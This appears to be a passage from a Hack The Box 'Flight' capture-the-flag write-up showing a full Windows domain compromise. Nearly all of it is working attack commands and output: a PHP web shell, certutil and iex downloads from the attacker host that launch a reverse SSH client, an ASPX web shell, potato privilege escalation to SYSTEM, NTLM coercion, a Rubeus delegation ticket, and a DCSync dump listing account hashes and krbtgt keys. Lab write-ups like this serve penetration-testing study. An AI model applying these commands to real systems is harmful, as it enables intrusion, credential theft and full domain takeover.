┌──(bravosec㉿fsociety)-[~/htb/Flight]
└─$ echo '<?php system($_REQUEST["c"]); ?>' >> cache.php
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Flight]
└─$ smbclient '//flight.htb/Web' -U 'C.BUM%Tikkycoll_431012284'
Try "help" to get a list of possible commands.
smb: \> cd school.flight.htb\
smb: \school.flight.htb\> put cache.php
putting file cache.php as \school.flight.htb\cache.php (0.0 kb/s) (average 0.0 kb/s)
smb: \school.flight.htb\>
```

Thankfully it worked and I don't have to do any bypasses

```bash
┌──(bravosec㉿fsociety)-[~/htb/Flight]
└─$ curl 'http://school.flight.htb/cache.php' --data-urlencode 'c=whoami'
flight\svc_apache
```

### Reverse SSH

> https://github.com/NHAS/reverse_ssh

Prepare **reverse_ssh**

```bash
mkdir -p www&&cd www
ln -s /opt/sectools/c2/reverse_ssh/bin/client.exe
python -m http.server 80
```

```bash
cd /opt/sectools/c2/reverse_ssh/bin && ./server 0.0.0.0:443
```

Upload and start the client

```bash
┌──(bravosec㉿fsociety)-[~/htb/Flight]
└─$ curl 'http://school.flight.htb/cache.php' --data-urlencode 'c=certutil -urlcache -split -f http://10.10.16.30/client.exe C:\programdata\client.exe'
****  Online  ****
  000000  ...
  eea200
CertUtil: -URLCache command completed successfully.


┌──(bravosec㉿fsociety)-[~/htb/Flight]
└─$ curl 'http://school.flight.htb/cache.php' --data-urlencode 'c=C:\programdata\client.exe -d 10.10.16.30:443'
```

Connect to the client

```bash
┌──(bravosec㉿fsociety)-[~/htb/Flight]
└─$ ssh 127.0.0.1 -p 443 ls -t
                            Targets
+------------------------------------------+--------------------------+
| IDs                                      | Version                  |
+------------------------------------------+--------------------------+
| 7ce9e834bb1d9f5b79541d301f6d866a1ad0a5e0 | SSH-v2.2.3-windows_amd64 |
| 6e867dd1ca01b0045c1489aeb0680e37a1ad0129 |                          |
| flight.svc_apache.g0                     |                          |
| 10.129.228.120:51515                     |                          |
+------------------------------------------+--------------------------+
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Flight]
└─$ ssh -J 127.0.0.1:443 flight.svc_apache.g0
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\xampp\htdocs\school.flight.htb> whoami
flight\svc_apache
```

## From svc_apache to c.bum


### Enumeration

```powershell
PS C:\xampp\htdocs\school.flight.htb> whoami /all

USER INFORMATION
----------------

User Name         SID
================= ==============================================
flight\svc_apache S-1-5-21-4078382237-1492182817-2568127209-1612


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                       Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeCreateGlobalPrivilege       Create global objects          Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

```powershell
PS C:\xampp\htdocs\school.flight.htb> systeminfo

Host Name:                 G0
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Primary Domain Controller
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00429-00521-62775-AA402
Original Install Date:     7/20/2021, 11:21:49 AM
System Boot Time:          12/22/2023, 6:29:46 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.16707776.B64.2008070230, 8/7/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume3
System Locale:             en-us;English (United States)
Input Locale:              it;Italian (Italy)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 2,026 MB
Virtual Memory: Max Size:  5,503 MB
Virtual Memory: Available: 2,601 MB
Virtual Memory: In Use:    2,902 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    flight.htb
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.228.120
                                 [02]: fe80::6430:ae4f:da36:ecf5
                                 [03]: dead:beef::6430:ae4f:da36:ecf5
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

```powershell
PS C:\> ls -Force | sort LastWriteTime


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hsl        7/20/2021  12:20 PM                Documents and Settings
d-----        7/20/2021  12:23 PM                Program Files (x86)
d-----         6/7/2022   6:39 AM                PerfLogs
d--hs-        9/22/2022  12:28 PM                System Volume Information
d-----        9/22/2022  12:28 PM                StorageReports
d-----        9/22/2022   1:16 PM                xampp
d-r---        9/22/2022   1:16 PM                Users
d-r---       10/21/2022  11:49 AM                Program Files
d--hs-       10/21/2022  11:50 AM                Config.Msi
d-----       10/21/2022  11:52 AM                Windows
d--hs-       10/29/2022   3:53 PM                Recovery
d-----       12/23/2023   6:06 PM                Shared
d--h--       12/23/2023   8:03 PM                ProgramData
d--hs-       12/23/2023   9:29 PM                $Recycle.Bin
-a-hs-       12/23/2023  11:25 PM     1476395008 pagefile.sys
d-----       12/24/2023  12:17 AM                inetpub
```

Port `8000` isn't accessible from our machine and running as **SYSTEM** (PID 4)

```powershell
PS C:\xampp\htdocs\school.flight.htb> netstat -ano -p tcp | sls listen

  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       5608
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       664
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       924
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       664
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       5608
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       664
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       924
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       664
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       664
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       664
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       2352
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       504
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1180
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1568
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       664
  TCP    0.0.0.0:49677          0.0.0.0:0              LISTENING       664
  TCP    0.0.0.0:49678          0.0.0.0:0              LISTENING       664
  TCP    0.0.0.0:49690          0.0.0.0:0              LISTENING       2616
  TCP    0.0.0.0:49697          0.0.0.0:0              LISTENING       1124
  TCP    0.0.0.0:49705          0.0.0.0:0              LISTENING       640
  TCP    10.129.228.120:53      0.0.0.0:0              LISTENING       2616
  TCP    10.129.228.120:139     0.0.0.0:0              LISTENING       4
  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       2616
```

> **A quick way to check ports that are not accessible from outside the machine**
> 
> ```bash
> cat nmap/all_tcp_ports.nmap | tail -n +2 | grep -i open | awk '{print $1}' | cut -d'/' -f1 | tr '\n' ' ' > n
> cat loot/netstat.txt | awk '$2 ~ /0.0.0.0/' | awk -F: '{print $2}' | awk '{print $1}' | xargs > h
> ```
> Xonsh (Python + Bash)
> ```bash
> host = $(cat h).split()
> nmap = $(cat n).split()
> [p for p in host if p not in nmap]
> ```
> Result
> ```bash
> ['443', '8000', '47001', '49664', '49665', '49666', '49705']
> ```
{: .prompt-tip }

### Enumerate port 8000

```bash
┌──(bravosec㉿fsociety)-[~/htb/Flight]
└─$ ssh -J 127.0.0.1:443 flight.svc_apache.g0 -L 8000:127.0.0.1:8000 -N
```

It says that the web root is at `C:\inetpub\development`

![](/assets/obsidian/be3fb0ebf432da373430b750bd9e82a1.png)

```powershell
PS C:\xampp\htdocs\school.flight.htb> cd C:\inetpub\development
PS C:\inetpub\development> ls -Force


    Directory: C:\inetpub\development


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       12/24/2023   2:12 AM                development
```

> http://127.0.0.1:8000/development/

It was the develop branch of flight aviation site

![](/assets/obsidian/8e3d890de8e4e4266d5d160034b1bc30.png)

Only `C.Bum` has write access to the web root, reasonable since he's the `Senior Web Developer`

```powershell
PS C:\inetpub\development> icacls .
. flight\C.Bum:(OI)(CI)(W)
  NT SERVICE\TrustedInstaller:(I)(F)
  NT SERVICE\TrustedInstaller:(I)(OI)(CI)(IO)(F)
  NT AUTHORITY\SYSTEM:(I)(F)
  NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
  BUILTIN\Administrators:(I)(F)
  BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
  BUILTIN\Users:(I)(RX)
  BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
  CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```

### Impersonate C.Bum via runas

We have `C.Bum`'s credential, impersonate it

> Use [RunasCs](https://github.com/antonioCoco/RunasCs) if don't have an interactive shell
> ```bash
> iex (new-object net.webclient).downloadstring("http://10.10.16.30/Invoke-RunasCs.ps1")
> Invoke-RunasCs -Username "C.BUM" -Password "Tikkycoll_431012284" -Command "C:\ProgramData\client.exe -d 10.10.16.30:443"
> ```
{: .prompt-info }

```bash
PS C:\xampp\htdocs\school.flight.htb> runas.exe /user:C.BUM "C:\ProgramData\client.exe -d 10.10.16.30:443"
Enter the password for C.BUM:Tikkycoll_431012284
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Flight]
└─$ ssh 127.0.0.1 -p 443 ls -t
                            Targets
+------------------------------------------+--------------------------+
| IDs                                      | Version                  |
+------------------------------------------+--------------------------+
| 1d8bb536f90495650247786be59169fe12f2c7dd | SSH-v2.2.3-windows_amd64 |
| 6e867dd1ca01b0045c1489aeb0680e37a1ad0129 |                          |
| flight.c.bum.g0                          |                          |
| 10.129.228.120:53454                     |                          |
+------------------------------------------+--------------------------+
| ec57be138edcaa5e39dc6617ea3aeda315bd60ab | SSH-v2.2.3-windows_amd64 |
| 6e867dd1ca01b0045c1489aeb0680e37a1ad0129 |                          |
| flight.svc_apache.g0                     |                          |
| 10.129.228.120:51655                     |                          |
+------------------------------------------+--------------------------+
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Flight]
└─$ ssh -J 127.0.0.1:443 flight.c.bum.g0
PS C:\Windows\system32> whoami
flight\c.bum
PS C:\Windows\system32> cat $env:USERPROFILE\desktop\user.txt
9ecf9ca40bdc87432438b600240fe4f3
```

# Root Flag
---

## From c.bum to iis apppool


### ASPX webshell

```bash
┌──(bravosec㉿fsociety)-[~/htb/Flight]
└─$ cp /usr/share/webshells/aspx/cmdasp.aspx .

┌──(bravosec㉿fsociety)-[~/htb/Flight]
└─$ scp -J 127.0.0.1:443 cmdasp.aspx flight.c.bum.g0:'C:\inetpub\development\development\cache.aspx'
cmdasp.aspx      
```

![](/assets/obsidian/64d3bb152c1f9479f4edc7ff346c6e3c.png)

```
C:\ProgramData\client.exe -d 10.10.16.30:443
```

![](/assets/obsidian/b6c1faa0c91437fa4644bf179a0960ee.png)

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/c2/reverse_ssh/bin]
└─$ ssh 127.0.0.1 -p 443 ls -t
                            Targets
+------------------------------------------+--------------------------+
| IDs                                      | Version                  |
+------------------------------------------+--------------------------+
| 11a1230c9cf1073584aabe899d1f69e6f4232a56 | SSH-v2.2.3-windows_amd64 |
| 6e867dd1ca01b0045c1489aeb0680e37a1ad0129 |                          |
| unknown.g0                               |                          |
| 10.129.228.120:53902                     |                          |
+------------------------------------------+--------------------------+
| ec57be138edcaa5e39dc6617ea3aeda315bd60ab | SSH-v2.2.3-windows_amd64 |
| 6e867dd1ca01b0045c1489aeb0680e37a1ad0129 |                          |
| flight.svc_apache.g0                     |                          |
| 10.129.228.120:51655                     |                          |
+------------------------------------------+--------------------------+
| fbfe256d04630f34e9bec520f7dfc96a4785c066 | SSH-v2.2.3-windows_amd64 |
| 6e867dd1ca01b0045c1489aeb0680e37a1ad0129 |                          |
| flight.c.bum.g0                          |                          |
| 10.129.228.120:53821                     |                          |
+------------------------------------------+--------------------------+
```

```powershell
┌──(bravosec㉿fsociety)-[~/htb/Flight]
└─$ ssh -J 127.0.0.1:443 unknown.g0
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv> whoami
Error reading or writing history file 'C:\Windows\system32\config\systemprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt': Access to the path 'C:\Windows\system32\config\
systemprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine' is denied.
umiis apppool\defaultapppool
PS C:\windows\system32\inetsrv> Set-PSReadLineOption -HistorySaveStyle SaveNothing
Error reading or writing history file 'C:\Windows\system32\config\systemprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt': Access to the path 'C:\Windows\system32\config\
systemprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine' is denied.
This error will not be reported again in this session. Consider using a different path with:
    Set-PSReadLineOption -HistorySavePath <Path>
Or not saving history with:
    Set-PSReadLineOption -HistorySaveStyle SaveNothing
um
PS C:\windows\system32\inetsrv> whoami
iis apppool\defaultapppool
PS C:\windows\system32\inetsrv>
```

## From iis apppool to Domain Admin


### Foothold

```powershell
PS C:\windows\system32\inetsrv> whoami /all

USER INFORMATION
----------------

User Name                  SID
========================== =============================================================
iis apppool\defaultapppool S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                       Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                          Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
                                           Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

**3 main ways to privilege escalate** :
1. Abuse `SeImpersonatePrivilege`
2. Request a `TGT` with `iis apppool\defaultapppool` then **DCSync** (In [Additional](#Privilege+escalation+with+machine+account+for+DC) section)
3. (Not necessary) Coerce an auth to our machine then **ntlmrelay** to any machines that has **LDAP Signing** disabled in the domain (Abuse Methods - [thehackerrecipes](https://www.thehacker.recipes/ad/movement/ntlm/relay#abuse))

### Abuse privilege tokens

> **Godpotato works too**
> > https://github.com/BeichenDream/GodPotato
> 
> **Godpotato** was designed to work for newer versions of windows (`Windows Server 2012 - Windows Server 2022 Windows8 - Windows 11`)
> ```bash
> c:\windows\temp\GodPotato-NET4.exe -cmd "C:\ProgramData\client.exe -d 10.10.16.30:443"
> ```
> ![](/assets/obsidian/d23e7607308ed8dc8c352a68753c37b6.png)
{: .prompt-tip }

> https://github.com/antonioCoco/JuicyPotatoNG

```bash
PS C:\windows\system32\inetsrv> iwr 10.10.16.30/JuicyPotatoNG.exe -o C:\ProgramData\j.exe
PS C:\windows\system32\inetsrv> C:\ProgramData\j.exe -t * -p "C:\ProgramData\client.exe" -a "-d 10.10.16.30:443"


         JuicyPotatoNG
         by decoder_it & splinter_code

[*] Testing CLSID {854A20FB-2D44-457D-992F-EF13785D2B51} - COM server port 10247
[+] authresult success {854A20FB-2D44-457D-992F-EF13785D2B51};NT AUTHORITY\SYSTEM;Impersonation
[+] CreateProcessAsUser OK
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Flight]
└─$ ssh 127.0.0.1 -p 443 ls -t
                            Targets
+------------------------------------------+--------------------------+
| IDs                                      | Version                  |
+------------------------------------------+--------------------------+
| 11a1230c9cf1073584aabe899d1f69e6f4232a56 | SSH-v2.2.3-windows_amd64 |
| 6e867dd1ca01b0045c1489aeb0680e37a1ad0129 |                          |
| unknown.g0                               |                          |
| 10.129.228.120:53902                     |                          |
+------------------------------------------+--------------------------+
| d844a095fcda845d45788db6e54cdc82de4cd36f | SSH-v2.2.3-windows_amd64 |
| 6e867dd1ca01b0045c1489aeb0680e37a1ad0129 |                          |
| nt.authority.system.g0                   |                          |
| 10.129.228.120:49345                     |                          |
+------------------------------------------+--------------------------+
| ec57be138edcaa5e39dc6617ea3aeda315bd60ab | SSH-v2.2.3-windows_amd64 |
| 6e867dd1ca01b0045c1489aeb0680e37a1ad0129 |                          |
| flight.svc_apache.g0                     |                          |
| 10.129.228.120:51655                     |                          |
+------------------------------------------+--------------------------+
| fbfe256d04630f34e9bec520f7dfc96a4785c066 | SSH-v2.2.3-windows_amd64 |
| 6e867dd1ca01b0045c1489aeb0680e37a1ad0129 |                          |
| flight.c.bum.g0                          |                          |
| 10.129.228.120:53821                     |                          |
+------------------------------------------+--------------------------+
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Flight]
└─$ ssh -J 127.0.0.1:443 nt.authority.system.g0
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\> whoami
nt authority\system
PS C:\> cat C:\users\Administrator\Desktop\root.txt
7f3481e32a05532e02fc9e035f21aba8
PS C:\>
```


# Additional
---


## Coercer

> https://github.com/p0dalirius/Coercer

```bash
sudo responder -A -I tun0 -v
```

```bash
coercer coerce -l 10.10.16.30 -t flight.htb -u 'svc_apache' -p 'S@Ss!K@*t13' -v
```

![](/assets/obsidian/15552efd92ef8752b264cf50784f2a97.png)

```bash
[SMB] NTLMv2-SSP Client   : 10.129.228.120
[SMB] NTLMv2-SSP Username : flight\G0$
[SMB] NTLMv2-SSP Hash     : G0$::flight:855309d97302eafb:4EBDB596C65707241E1DD2E2393B47D1:0101000000000000002C25B6F535DA01FE45A69E06AF8485000000000200080050004A005600330001001E00570049004E002D005300470043003100520053005900460044003100460004003400570049004E002D00530047004300310052005300590046004400310046002E0050004A00560033002E004C004F00430041004C000300140050004A00560033002E004C004F00430041004C000500140050004A00560033002E004C004F00430041004C0007000800002C25B6F535DA01060004000200000008003000300000000000000000000000004000005CE573E2C7013E6F3367522C2932A4C0331BD7FD990711471B9252C9D582E0D90A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330030000000000000000000
```

Default machine account password have `120+ characters` so it's unlikely crackable, and there's no other targets for me to relay to

```bash
hashcat G0_ntlm.hash /opt/wordlists/rockyou.txt
hashcat G0_ntlm.hash /opt/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```


### Request Delegation TGT

- `iis apppool\defaultapppool` is a service / [Microsoft Virtual Account](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-service-accounts) that authenticates as **Machine Account**
- **Machine Account** for Domain Controller can abuse **S4U2self** to perform **DCSync**
- **Service for User to Self (S4U2self)** allows a service to obtain a Service Ticket, on behalf of a user (called "principal"), to itself.

> More detailed explanation - https://www.thehacker.recipes/ad/movement/kerberos/delegations/s4u2self-abuse

Using **rubeus** from [PowerSharpPack](https://github.com/S3cur3Th1sSh1t/PowerSharpPack)

```bash
PS C:\windows\system32\inetsrv> iex(new-object net.webclient).downloadstring("http://10.10.16.30/Invoke-Rubeus.ps1")
PS C:\windows\system32\inetsrv> Invoke-Rubeus -Command "tgtdeleg /nowrap"

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0


[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/g0.flight.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: yov1AZkIMcPVgwLVJkwJbheh/Ludmb4nQnwdkLoBO4k=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIFVDCCBVCgAwIBBaEDAgEWooIEZDCCBGBhggRcMIIEWKADAgEFoQwbCkZMSUdIVC5IVEKiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkZMSUdIVC5IVEKjggQgMIIEHKADAgESoQMCAQKiggQOBIIECjFz261HTgj1lRoYQsxGyLn2ufH+kmYeO9+/XhWeawq+N0228Ao2Xjp
9KYw/NltNtrRVSQb0WQ4naCmV5KB6PWl7rVoVpfy/A4BXwxEI/Hl9Pq16MaAZqRND7VtglzNfafsyQvG+VJJKlCfUtcA/bC4wtJun5M2Foll+LOcU+w1kPMqAeJ8W3i3yCcTVK/nJOJKdd7x94K+wLR5gOUK+nReUOv8x6YBNc3t9Aeov7fWlxvuIChPRZQRDTdYxA9pXiHPIHNXC
0uCG3fG7NqDepqa2UlXmH6y1BDtd5lf5S/6VXeBQ4/jvD+dsvMNAy3HROg/F1aYfoYrV7+a11Nsbh2nzWERPhCjqmgcs4ndHA5XKhC901Id1ca0HL4RxUv5DL2yKTOwQ9uRlhYtfcpJ4lUCMin1a4gpjkHfHcH+3LeSMjJ0rkoxdl7+SrH23LqUh+HXp4I1bx6RYz2xUucvoKagyM
OnFiPLVkc2sr4pwAKzRTjF2FN97BILbiwS1lFV7HKJWxAL5HcUpuZi7FewNSwP+skarW6YbNzu9cIZpj/DNxRyHZmOGm1rTzp7nXogdcyfHRQTYyw6JSzozvGcxCXoJCxOg5fA+cCrmasMOzlie5j2t2qfdA2K3I7TgjKTjvWekRn+4czGOqjaycTDOFW3t8QVpa5mBbei/JsSWSA
PmqQmmtA2zZpCP/pFYSHJ9/+kI63jsNxRLVjKt3zakYPvIeOJTify5TQZThHufxbcks/zbNDqn5MZ07+IDSRv19T/CpdE1bfQNc/zcI/JzC6BD4/2WwP6jjdL0V2Y2jBBhu+nMpBcX07w9S516QHrc6yzn1sHqf/yY4vwFkYFz74unfqu70ifntJaQi/sW/1SmXOJGq09qctMGHYw
6FB/mbgFX1KeePZM5d52G2Y/EWpXSKnq0XIFPH7E+inr2CFDJ/pY+EcWS294k/FZU2IPMdfnhIYM3mdOC13YUrhbia2QXOYaFo19fimMQ5xxyc8j7My0sWB8V6Qv1XtDmdxEjSNiQFkTBLd2fFIyYml0ADCQnMaxQcKnDUicJi6b20A1AT8IlM1PH7W+nSvf9vDnKnEvR0e2opRUd
yd2xl8BNBfi1QqL9y3eSgdJuk+Hgk8Y9oHsmGuIxE/7lmr9zAwuDHXngTagQzbYct86M7DhpssLCO1yGKPY7uro0kR1tJgyifXMcQUXRQTlZh7umaobky1JscKplDhqmgKHwKMujuUEidTlPn5Qkt06gvUOhmIUMXbFcz9GKgWIImxIezrlUVxiCN5TXWROBpI6FeqcwdXEXUh884
7OuwcBJtcusjkAxpqO/ZpJ33rIu9Vj2ir+TxyRpfQxH4/sRTdHAD4v3lCylNV6srpcpnd1Go4HbMIHYoAMCAQCigdAEgc19gcowgceggcQwgcEwgb6gKzApoAMCARKhIgQgzRMfoBjgXwMLJdLkQzlqRL9hrp217TSNTI+AWsky/vOhDBsKRkxJR0hULkhUQqIQMA6gAwIBAaEHMA
UbA0cwJKMHAwUAYKEAAKURGA8yMDIzMTIyNDEwNTczNFqmERgPMjAyMzEyMjQyMDU3MzRapxEYDzIwMjMxMjMxMTA1NzM0WqgMGwpGTElHSFQuSFRCqR8wHaADAgECoRYwFBsGa3JidGd0GwpGTElHSFQuSFRC
```


### Convert kirbi to ccache

```bash
┌──(bravosec㉿fsociety)-[~/htb/Flight]
└─$ base64 -d -i machine_acc.kirbi > machine_acc.kirbi.decode

┌──(bravosec㉿fsociety)-[~/htb/Flight]
└─$ ticketConverter.py machine_acc.kirbi.decode machine_acc.ccache
Impacket v0.12.0.dev1+20231114.165227.4b56c18 - Copyright 2023 Fortra

[*] converting kirbi to ccache...
[+] done
```

### Dcsync

Sync time with DC

```bash
sudo ntpdate flight.htb
```

Dump NTDS

```bash
┌──(bravosec㉿fsociety)-[~/htb/Flight]
└─$ export KRB5CCNAME=machine_acc.ccache

┌──(bravosec㉿fsociety)-[~/htb/Flight]
└─$ secretsdump.py -k g0.flight.htb -outputfile secretsdump
Impacket v0.12.0.dev1+20231114.165227.4b56c18 - Copyright 2023 Fortra

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6a2b6ce4d7121e112aeacbc6bd499a7f:::
S.Moon:1602:aad3b435b51404eeaad3b435b51404ee:f36b6972be65bc4eaa6983b5e9f1728f:::
R.Cold:1603:aad3b435b51404eeaad3b435b51404ee:5607f6eafc91b3506c622f70e7a77ce0:::
G.Lors:1604:aad3b435b51404eeaad3b435b51404ee:affa4975fc1019229a90067f1ff4af8d:::
L.Kein:1605:aad3b435b51404eeaad3b435b51404ee:4345fc90cb60ef29363a5f38e24413d5:::
M.Gold:1606:aad3b435b51404eeaad3b435b51404ee:78566aef5cd5d63acafdf7fed7a931ff:::
C.Bum:1607:aad3b435b51404eeaad3b435b51404ee:bc0359f62da42f8023fdde0949f4a359:::
W.Walker:1608:aad3b435b51404eeaad3b435b51404ee:ec52dceaec5a847af98c1f9de3e9b716:::
I.Francis:1609:aad3b435b51404eeaad3b435b51404ee:4344da689ee61b6fbbcdfa9303d324bc:::
D.Truff:1610:aad3b435b51404eeaad3b435b51404ee:b89f7c98ece6ca250a59a9f4c1533d44:::
V.Stevens:1611:aad3b435b51404eeaad3b435b51404ee:2a4836e3331ed290bd1c2fd2b50beb41:::
svc_apache:1612:aad3b435b51404eeaad3b435b51404ee:f36b6972be65bc4eaa6983b5e9f1728f:::
O.Possum:1613:aad3b435b51404eeaad3b435b51404ee:68ec50916875888f44caff424cd3f8ac:::
G0$:1001:aad3b435b51404eeaad3b435b51404ee:140547f31f4dbb4599dc90ea84c27e6b:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:08c3eb806e4a83cdc660a54970bf3f3043256638aea2b62c317feffb75d89322
Administrator:aes128-cts-hmac-sha1-96:735ebdcaa24aad6bf0dc154fcdcb9465
Administrator:des-cbc-md5:c7754cb5498c2a2f
krbtgt:aes256-cts-hmac-sha1-96:fb234268e90162081d11b7e9d5097091be02f42c25eec0d4bbf8a2442e9d40d0
